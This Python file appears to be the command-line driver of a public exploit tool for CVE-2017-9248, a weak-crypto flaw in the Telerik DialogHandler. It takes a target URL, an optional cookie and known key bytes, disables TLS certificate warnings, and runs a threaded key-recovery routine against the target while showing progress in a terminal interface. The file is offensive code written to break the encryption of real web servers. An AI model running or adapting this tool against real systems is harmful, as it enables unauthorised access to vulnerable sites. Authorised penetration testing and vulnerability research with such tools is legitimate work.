import time
import sys
from datetime import datetime
import signal
from argparse import ArgumentParser
from lib.dpcryptolib import *
from lib.terminalview import * 

import threading
from queue import Queue

from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


class multiThreadHandler():
    def __init__(self,CO):
        self.CO = CO
        self.lock = threading.Lock()
        self.q = Queue()

    def worker(self):
        while True:
            domain = self.q.get(CO)
            self.do_work(CO)
            self.q.task_done()

    def do_work(self,CO):
        CO.findKey()

    
    def run(self):
        
        t = threading.Thread(target=self.worker)
        t.daemon = True
        t.start()

        self.q.put(self.CO)
    #    self.q.join()
        return


def main_usage():

    print("dp_cryptomg.py 0.2")
    print("Telerik DialogHandler Weak Crypto Exploit (CVE-2017-9248)")
    print("@paulmmueller\n")


# CLI arguments

if __name__ == '__main__':

    parser = ArgumentParser(usage=main_usage(),add_help=False)
    parser.add_argument('-u', '--url',  help='Target ID', required = True)
    parser.add_argument('-h', '--help', help ='print the help screen and exit', required = False,action='store_true')
    parser.add_argument('-d', '--debug', help='Enable debugging mode', required = False, action='store_true')
    parser.add_argument('-a', '--all', help='Enable all 256 possible characters, default is ascii printable', required = False, action='store_true')
    parser.add_argument('-c', '--cookie', help='Add optional cookie header to every request', required = False)
    parser.add_argument('-k', '--known-key', help='The partial or complete known key, in HEX format', required = False)
    parser.add_argument('-v', '--version', help='Specify the Telerik version, if known', required = False)
    parser.add_argument('-l', '--length', help='The length of the key, if known', required = False)

    args = parser.parse_args()
    print(args)

    args, unknown = parser.parse_known_args()

    if args.help:
        main_usage()
        parser.print_help()
        sys.exit()

    if 'Telerik.Web.UI.DialogHandler.aspx' in args.url:
        handler = 'DH'
    elif 'Telerik.Web.UI.SpellCheckHandler.axd' in args.url:
        handler = 'SP'
    else:
        print("Invalid URL")
        sys.exit()

    if args.cookie:
        cookie = args.cookie
    else:
        cookie = None

    debug = False
    if args.debug:
        debug = True

    if args.known_key:
        knownkey = bytes.fromhex(args.known_key)
    else:
        knownkey = b""

    if args.length:
        keylength = int(args.length)
    else:
        keylength = 48


    if args.version:
        version = args.version
    else:
        version = None

    allmode = False
    if args.all:
        allmode = True

    terminal = TerminalView()

    CO = CryptOMG(debug=debug,url=args.url,handler=handler,cookie=cookie,knownkey=knownkey,version=version,length=keylength,allmode=allmode,terminal=terminal,mthlock=None)
    terminal.cryptomg = CO

    mth = multiThreadHandler(CO)
    CO.mthlock = mth.lock

    terminal.t.init_window()

    with terminal.t.cbreak(), terminal.t.hidden_cursor():
        keypress = ''
        exit = False
        mth_started = False
        while exit == False:
            while keypress != 'q':
                if not mth_started:
                    mth.run()
                    mth_started = True
              #  mth.lock.acquire()
                keypress = terminal.t.inkey(timeout=0)
                terminal.initial_draw()
           #     mth.lock.release()
                keypress = terminal.t.inkey(timeout=5)
            keypress = ''
            terminal.clear()
            print(terminal.t.move_y(terminal.t.height // 2) + terminal.t.center("Press 'q' to confirm exit. Press any other key to continue").rstrip())
            val = terminal.t.inkey()

            if val.lower() == 'q':
                exit = True
        print(terminal.t.clear)
        print(terminal.t.move_y(terminal.t.height // 2) + terminal.t.center("Exiting...").rstrip())
        time.sleep(1)
        print(terminal.t.clear)
        terminal.cleanup()
        sys.exit()



